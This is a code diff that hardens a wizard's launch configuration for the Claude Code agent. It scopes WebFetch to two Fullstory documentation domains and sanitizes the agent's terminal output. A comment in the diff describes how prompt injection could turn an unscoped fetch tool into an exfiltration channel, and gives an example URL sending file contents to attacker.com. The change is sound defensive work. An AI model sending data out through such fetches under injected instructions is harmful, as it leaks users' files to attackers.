@@ -2,7 +2,7 @@ import os from 'node:os';
 import path from 'node:path';
 import * as p from '@clack/prompts';
 import pc from 'picocolors';
-import { firstExistingPath, runTerminalAgent, which } from './helpers.js';
+import { firstExistingPath, runTerminalAgent, sanitizeTerminalOutput, which } from './helpers.js';
 import { extractTelemetryMarkers } from './telemetry-marker.js';
 import type { AgentDefinition, LaunchContext, LaunchResult } from './types.js';
 
@@ -11,9 +11,15 @@ import type { AgentDefinition, LaunchContext, LaunchResult } from './types.js';
  * and dependency installs. Telemetry needs no tool here — the agent just prints
  * markers to stdout that the wizard parses. Everything else falls back to
  * Claude Code's own permission rules.
+ *
+ * WebFetch is scoped to the two Subtext/Fullstory doc domains the install
+ * actually needs. Leaving it unscoped would make it an exfiltration channel
+ * under prompt injection (fetch `https://attacker.com/?data=<file contents>`);
+ * the domain scope closes that.
  */
 const ALLOWED_TOOLS = [
-  'WebFetch',
+  'WebFetch(domain:subtext.fullstory.com)',
+  'WebFetch(domain:developer.fullstory.com)',
   'Bash(npm install:*)',
   'Bash(pnpm add:*)',
   'Bash(yarn add:*)',
@@ -82,7 +88,9 @@ async function launch(ctx: LaunchContext): Promise<LaunchResult> {
           if (block.type === 'text' && block.text?.trim()) {
             // The prompt has the agent print telemetry markers as plain text;
             // pull them out of the stream and display only the rest.
-            const text = extractTelemetryMarkers(block.text, ctx.onTelemetry).trim();
+            const text = sanitizeTerminalOutput(
+              extractTelemetryMarkers(block.text, ctx.onTelemetry),
+            ).trim();
             if (text) console.log(pc.dim(text));
           } else if (block.type === 'tool_use') {
             console.log(pc.dim(`  → ${describeToolUse(block.name, block.input)}`));
@@ -99,7 +107,9 @@ async function launch(ctx: LaunchContext): Promise<LaunchResult> {
     // The result event duplicates the final assistant message, so any marker
     // lines already stripped from the streamed display would resurface here.
     // Strip them again; re-reported markers are deduped by the caller.
-    const cleaned = extractTelemetryMarkers(resultText, ctx.onTelemetry).trim();
+    const cleaned = sanitizeTerminalOutput(
+      extractTelemetryMarkers(resultText, ctx.onTelemetry),
+    ).trim();
     if (cleaned) p.note(cleaned, 'Claude Code result');
   }
   return { mode: 'ran', exitCode };
@@ -109,6 +119,8 @@ export const claudeCode: AgentDefinition = {
   id: 'claude-code',
   name: 'Claude Code',
   kind: 'terminal',
+  autonomy:
+    'auto-accepting file edits and running a limited set of commands (dependency installs and Subtext doc fetches)',
   async detect() {
     const binaryPath = await findClaudeBinary();
     if (!binaryPath) return null;
